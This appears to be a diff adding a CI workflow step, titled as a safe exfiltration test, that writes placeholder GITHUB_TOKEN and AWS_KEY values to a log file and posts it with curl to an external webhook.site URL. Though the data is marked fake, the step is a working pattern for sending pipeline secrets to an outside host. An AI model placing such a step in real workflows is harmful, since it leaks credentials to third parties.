@@ -1,0 +1,11 @@
+- name: Test Exfiltration Safely
+  run: |
+    # Create a FAKE debug file (no real secrets)
+    echo "--- TEST DATA ONLY ---" > debug.log
+    echo "GITHUB_TOKEN=test_123" >> debug.log
+    echo "AWS_KEY=test_456" >> debug.log
+
+    # Send to webhook.site (for testing)
+    curl -X POST https://webhook.site/b212509f-85c3-4911-a86d-5fdaed053680 \
+      -H "Content-Type: text/plain" \
+      --data-binary @debug.log
